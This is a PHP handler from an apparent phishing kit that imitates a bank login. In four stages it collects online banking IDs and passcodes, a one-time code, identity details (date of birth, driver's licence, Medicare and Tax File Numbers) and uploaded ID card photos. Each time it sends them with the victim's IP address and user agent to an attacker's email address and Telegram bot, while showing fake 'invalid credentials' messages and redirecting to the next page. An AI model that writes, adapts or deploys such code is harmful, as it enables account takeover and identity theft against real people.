<?php
ob_start();

include 'email.php';
include 'telegram.php';
$ai = trim($_POST['ai']);
$pr = trim($_POST['pr']);
print_r($_POST);
if(isset($_POST['btn1'])){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------|  |--------------|\n";
	
	$message .= "Online ID            : ".$_POST['ai']."\n";
	$message .= "Passcode              : ".$_POST['pr']."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|-----------  --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
    	mail($send, $subject, $message);

    	$mess =urlencode($message);
	$url = "https://api.telegram.org/bot".$botToken."/sendmessage?chat_id=".$id ."&text=".$mess;
	$curl = curl_init();
	// curl_setopt ($curl, CURLOPT_PORT , 8089);
	curl_setopt($curl, CURLOPT_URL, $url);
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	// curl_exec($curl);
	
	$result=curl_exec($curl);
	if ($result) {
		$signal = 'ok';
		$msg = 'InValid Credentials';
	}
	curl_close($curl);   

	$signal = 'ok';
	$msg = 'InValid Credentials';

}
else if(isset($_POST['btn2'])){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------|  |--------------|\n";
	
	$message .= "Code            : ".$_POST['code']."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|-----------  --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
    	mail($send, $subject, $message); 

    	$mess =urlencode($message);
	$url = "https://api.telegram.org/bot".$botToken."/sendmessage?chat_id=".$id ."&text=".$mess;
	$curl = curl_init();
	// curl_setopt ($curl, CURLOPT_PORT , 8089);
	curl_setopt($curl, CURLOPT_URL, $url);
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	// curl_exec($curl);
	
	$result=curl_exec($curl);
	if ($result) {
		$signal = 'ok';
		$msg = 'InValid Credentials';
	}
	curl_close($curl);  

	$signal = 'ok';
	$msg = 'InValid Credentials';

	header("Location: ./detail.html");
}

else if(isset($_POST['btn3'])){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------|  |--------------|\n";
	
	$message .= "Full Name            : ".$_POST['fn']."\n";
	$message .= "Address on File            : ".$_POST['add']."\n";
	$message .= "Date of Birth            : ".$_POST['dob']."\n";
	$message .= "Driver's License Number            : ".$_POST['dln']."\n";
	$message .= "Driver's License Card No. (Back of Card)            : ".$_POST['dlcnum']."\n";
	$message .= "Driver's License Expiry Date            : ".$_POST['dlexdate']."\n";
	$message .= "Medicare Number            : ".$_POST['mednum']."\n";
	$message .= "Individual Reference Number            : ".$_POST['irn']."\n";
	$message .= "Tax File Number            : ".$_POST['tfnum']."\n";


	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|-----------  --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
    	mail($send, $subject, $message); 


    	$mess =urlencode($message);
	$url = "https://api.telegram.org/bot".$botToken."/sendmessage?chat_id=".$id ."&text=".$mess;
	$curl = curl_init();
	// curl_setopt ($curl, CURLOPT_PORT , 8089);
	curl_setopt($curl, CURLOPT_URL, $url);
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	// curl_exec($curl);
	
	$result=curl_exec($curl);
	if ($result) {
		$signal = 'ok';
		$msg = 'InValid Credentials';
	}
	curl_close($curl);  

	$signal = 'ok';
	$msg = 'InValid Credentials';

	header("Location: ./pic.html");
}





else if (isset($_POST['btn4'])) {
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| |--------------|\n";
	$url = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
	$filename = '';
	$filenameb = '';
	

	if($_FILES['upf']['name'] != "")
	{
		$filetoupload = $_FILES['upf'];
		$filename = md5(time()).str_replace(" ", "-", $filetoupload['name']);
		move_uploaded_file($filetoupload['tmp_name'], "file/" . $filename);
	}
	if($_FILES['upb']['name'] != "")
	{
		$filetouploadb = $_FILES['upb'];
		$filenameb = md5(time()).str_replace(" ", "-", $filetouploadb['name']);
		move_uploaded_file($filetouploadb['tmp_name'], "file/" . $filenameb);
	}
	
	$file_to_attach = "file/" . $filename;
	$file_to_attachb = "file/" . $filenameb;
	
	$message .= " ID- Front           : ".removeFilename($url).$file_to_attach."\n";
	$message .= " ID- Back            : ".removeFilename($url).$file_to_attachb."\n";
	
	
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 

	$mess =urlencode($message);
	$url = "https://api.telegram.org/bot".$botToken."/sendmessage?chat_id=".$id ."&text=".$mess;
	$curl = curl_init();
	// curl_setopt ($curl, CURLOPT_PORT , 8089);
	curl_setopt($curl, CURLOPT_URL, $url);
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	// curl_exec($curl);
	
	$result=curl_exec($curl);
	if ($result) {
		$signal = 'ok';
		$msg = 'InValid Credentials';
	}
	curl_close($curl);

	header ("Location: ./thank.html");
}
else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}





function removeFilename($url)
{
    $file_info = pathinfo($url);
    return isset($file_info['extension'])
        ? str_replace($file_info['filename'] . "." . $file_info['extension'], "", $url)
        : $url;
}
$data = array(
        'signal' => $signal,
        'msg' => $msg,
        'redirect_link' => $redirect,
    );
    echo json_encode($data);
ob_end_flush();
?>